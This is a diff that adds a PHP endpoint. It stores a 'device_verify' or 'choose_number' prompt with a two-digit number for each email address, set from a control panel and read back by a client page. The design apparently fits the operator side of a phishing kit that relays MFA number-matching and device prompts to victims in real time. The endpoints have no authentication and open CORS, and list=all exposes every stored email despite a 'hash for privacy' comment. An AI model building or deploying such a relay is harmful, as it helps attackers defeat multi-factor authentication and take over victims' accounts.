@@ -1,0 +1,137 @@
+<?php
+header("Access-Control-Allow-Origin: *");
+header("Content-Type: application/json");
+
+// Simple file-based storage for verification prompts
+// In production, you'd use a database
+$dataFile = __DIR__ . '/verification_data.json';
+
+// Initialize data file if it doesn't exist
+if (!file_exists($dataFile)) {
+    file_put_contents($dataFile, json_encode([]));
+}
+
+// Handle GET request - check what prompt to show for an email
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['email']) && !isset($_GET['list'])) {
+    $email = trim($_GET['email']);
+
+    if (empty($email)) {
+        echo json_encode(['error' => 'Email required']);
+        exit;
+    }
+
+    $data = json_decode(file_get_contents($dataFile), true);
+    $emailKey = md5(strtolower($email)); // Use hash for privacy
+
+    if (isset($data[$emailKey]) && isset($data[$emailKey]['prompt_type'])) {
+        $response = [
+            'prompt_type' => $data[$emailKey]['prompt_type'],
+            'timestamp' => $data[$emailKey]['timestamp']
+        ];
+
+        // Include number if it's a choose_number prompt
+        if ($data[$emailKey]['prompt_type'] === 'choose_number' && isset($data[$emailKey]['number'])) {
+            $response['number'] = $data[$emailKey]['number'];
+        }
+
+        echo json_encode($response);
+    } else {
+        echo json_encode(['prompt_type' => null]);
+    }
+    exit;
+}
+
+// Handle POST request - set verification prompt for an email
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
+    $promptType = isset($_POST['prompt_type']) ? trim($_POST['prompt_type']) : '';
+
+    if (empty($email) || empty($promptType)) {
+        echo json_encode(['error' => 'Email and prompt_type required']);
+        exit;
+    }
+
+    if (!in_array($promptType, ['device_verify', 'choose_number'])) {
+        echo json_encode(['error' => 'Invalid prompt_type']);
+        exit;
+    }
+
+    $data = json_decode(file_get_contents($dataFile), true);
+    $emailKey = md5(strtolower($email));
+
+    $verificationData = [
+        'email' => $email,
+        'prompt_type' => $promptType,
+        'timestamp' => time()
+    ];
+
+    // For choose_number, also store the specific number
+    if ($promptType === 'choose_number') {
+        $number = isset($_POST['number']) ? trim($_POST['number']) : '';
+        if ($number === '') {
+            echo json_encode(['error' => 'Number required for choose_number prompt']);
+            exit;
+        }
+
+        // Validate that it's a number 0-99 (1-2 digits)
+        if (!is_numeric($number) || strlen($number) < 1 || strlen($number) > 2 || $number < 0 || $number > 99) {
+            echo json_encode(['error' => 'Must provide a number between 0-99']);
+            exit;
+        }
+
+        $verificationData['number'] = (int)$number;
+    }
+
+    $data[$emailKey] = $verificationData;
+
+    file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));
+
+    echo json_encode(['success' => true, 'message' => 'Verification prompt set']);
+    exit;
+}
+
+// Handle DELETE request - clear verification prompt
+if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
+    $email = isset($_GET['email']) ? trim($_GET['email']) : '';
+
+    if (empty($email)) {
+        echo json_encode(['error' => 'Email required']);
+        exit;
+    }
+
+    $data = json_decode(file_get_contents($dataFile), true);
+    $emailKey = md5(strtolower($email));
+
+    if (isset($data[$emailKey])) {
+        unset($data[$emailKey]);
+        file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));
+        echo json_encode(['success' => true, 'message' => 'Verification prompt cleared']);
+    } else {
+        echo json_encode(['error' => 'No verification prompt found for this email']);
+    }
+    exit;
+}
+
+// Redirect to control panel for UI
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_GET['email']) && !isset($_GET['list'])) {
+    header('Location: control.html');
+    exit;
+}
+
+// Handle list all request
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['list']) && $_GET['list'] === 'all') {
+    $data = json_decode(file_get_contents($dataFile), true);
+
+    // Clean up old entries (older than 1 hour)
+    $currentTime = time();
+    foreach ($data as $key => $item) {
+        if (($currentTime - $item['timestamp']) > 3600) { // 1 hour
+            unset($data[$key]);
+        }
+    }
+    file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));
+
+    echo json_encode($data);
+    exit;
+}
+?>
